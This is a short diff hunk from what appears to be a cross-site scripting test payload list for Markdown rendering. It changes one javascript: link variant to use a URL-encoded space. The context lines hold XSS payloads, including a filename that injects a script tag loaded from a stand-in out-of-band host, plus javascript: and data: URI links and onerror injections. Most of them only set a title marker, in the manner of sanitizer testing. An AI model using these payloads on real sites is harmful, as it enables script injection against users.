@@ -61,7 +61,7 @@ filename="><script src=//oast.example.test/b.js></script>.jpg
 [xss](javascript&colon;document.title='md-marker')
 [xss](data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC50aXRsZT0nbWQtbWFya2VyJzwvc2NyaXB0Pg==)
 [xss](  javascript:document.title='md-marker')
-[xss]( javascript:document.title='md-marker')
+[xss](%20javascript:document.title='md-marker')
 ![x](x"onerror="document.title='md-marker')
 ![x](x" onerror="document.title='md-marker')
 ![x](javascript:document.title='md-marker')
